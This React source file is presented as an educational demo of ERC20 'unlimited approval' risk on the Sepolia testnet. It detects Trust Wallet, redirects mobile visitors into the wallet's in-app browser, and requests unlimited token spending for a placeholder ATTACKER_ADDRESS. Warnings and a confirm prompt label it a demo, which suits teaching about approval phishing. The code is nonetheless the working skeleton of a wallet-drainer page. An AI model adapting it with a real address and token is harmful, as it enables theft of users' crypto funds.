import React, { useEffect, useState } from "react";
import { ethers } from "ethers";

/* =========================
   CONFIG
========================= */

// ✅ USDC on Sepolia
const TOKEN_ADDRESS = "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238";

// ⚠️ DEMO address (permission receiver)
const ATTACKER_ADDRESS = "0x1111111111111111111111111111111111111111";

// ERC20 ABI (minimum required)
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
];

// Unlimited approval value
const UNLIMITED =
  "115792089237316195423570985008687907853269984665640564039457584007913129639935";

function App() {
  const [wallet, setWallet] = useState(null);
  const [signer, setSigner] = useState(null);
  const [token, setToken] = useState(null);
  const [logs, setLogs] = useState([]);
  const [loading, setLoading] = useState(false);
  const [isTrustWallet, setIsTrustWallet] = useState(false);
  const [step, setStep] = useState(1);

  /* =========================
     HELPERS
  ========================= */

  const addLog = (msg) => setLogs((p) => [...p, msg]);
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  /* =========================
     TRUST WALLET DETECTION
     (Runs once on load)
  ========================= */

  useEffect(() => {
    // ❌ Desktop browser / MetaMask
    if (!window.ethereum?.isTrust) {
      addLog("❌ Trust Wallet browser not detected");

      // 👉 Mobile user? Auto-open Trust Wallet
      const isMobile = /Android|iPhone|iPad/i.test(navigator.userAgent);
      if (isMobile) {
        const url = encodeURIComponent(window.location.href);
        window.location.href =
          `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`;
      }
      return;
    }

    // ✅ Correct environment
    setIsTrustWallet(true);
    addLog("📱 Trust Wallet detected");
  }, []);

  /* =========================
     CONNECT TRUST WALLET
  ========================= */

  const connectWallet = async () => {
    try {
      if (!window.ethereum?.isTrust) {
        alert("Please open this site inside Trust Wallet Browser");
        return;
      }

      // ✅ Trust Wallet requires direct request
      await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const address = await signer.getAddress();
      const ethBalance = await provider.getBalance(address);

      // ✅ Enforce Sepolia
      const network = await provider.getNetwork();
      if (network.chainId !== 11155111) {
        addLog("❌ Switch Trust Wallet to Sepolia network");
        return;
      }

      const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);

      setSigner(signer);
      setToken(token);
      setWallet({
        address,
        short: address.slice(0, 6) + "..." + address.slice(-4),
        eth: ethers.utils.formatEther(ethBalance),
      });

      addLog("✅ Wallet connected successfully");
      setStep(2);
    } catch (err) {
      console.error(err);
      if (err.code === 4001) {
        addLog("❌ User rejected connection");
      } else {
        addLog("❌ Wallet connection failed");
      }
    }
  };

  /* =========================
     SIMULATION
  ========================= */

  const simulate = async () => {
    try {
      setLoading(true);
      setLogs([]);

      if (!wallet || !token) {
        addLog("❌ Wallet not ready");
        return;
      }

      addLog("🔍 Checking balance...");
      await sleep(500);

      const raw = await token.balanceOf(wallet.address);
      const decimals = await token.decimals();
      const balance = ethers.utils.formatUnits(raw, decimals);

      addLog(`💰 Balance: ${balance}`);
      await sleep(500);

      const ok = window.confirm(
        "⚠️ EDUCATIONAL DEMO\n\n" +
          "This will approve UNLIMITED token spending.\n\nContinue?"
      );

      if (!ok) {
        addLog("❌ User cancelled");
        return;
      }

      const tx = await token.approve(ATTACKER_ADDRESS, UNLIMITED);
      addLog(`📝 Tx sent: ${tx.hash}`);
      addLog("⏳ Waiting confirmation...");

      await tx.wait();

      addLog("🚨 UNLIMITED approval granted");
      setStep(3);
    } catch (err) {
      console.error(err);
      if (err.code === 4001) {
        addLog("❌ User rejected transaction");
      } else {
        addLog("❌ Transaction failed");
      }
    } finally {
      setLoading(false);
    }
  };

  /* =========================
     UI
  ========================= */

  return (
    <div className="min-h-screen bg-black text-white flex items-center justify-center p-4">
      <div className="max-w-xl w-full bg-zinc-900 rounded-xl p-6">
        <h1 className="text-xl font-bold text-center mb-4">
          🔐 Trust Wallet Approval Demo
        </h1>

        {/* CONNECTED BADGE */}
        {wallet && (
          <div className="bg-green-900/30 border border-green-700 text-green-400 text-sm p-2 rounded mb-3 text-center">
            ✅ Wallet Connected
          </div>
        )}

        {!isTrustWallet && (
          <div className="bg-red-900/30 p-3 rounded text-sm mb-4">
            ❌ Open this link inside <b>Trust Wallet Browser</b>
          </div>
        )}

        {step === 1 && (
          <button
            onClick={connectWallet}
            className="w-full py-3 bg-blue-600 rounded font-bold"
          >
            Connect Trust Wallet
          </button>
        )}

        {step === 2 && wallet && (
          <>
            <div className="bg-black p-3 rounded text-sm mb-3">
              <p>📱 Trust Wallet</p>
              <p>Address: {wallet.short}</p>
              <p>ETH: {wallet.eth}</p>
            </div>

            <button
              onClick={simulate}
              disabled={loading}
              className="w-full py-3 bg-red-600 rounded font-bold"
            >
              {loading ? "Processing..." : "Start Simulation"}
            </button>
          </>
        )}

        {step === 3 && (
          <div className="bg-black p-3 rounded text-sm space-y-2">
            {logs.map((l, i) => (
              <div key={i}>{l}</div>
            ))}
            <p className="text-red-400 mt-2">
              ⚠️ Unlimited approval is dangerous in real life.
            </p>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;
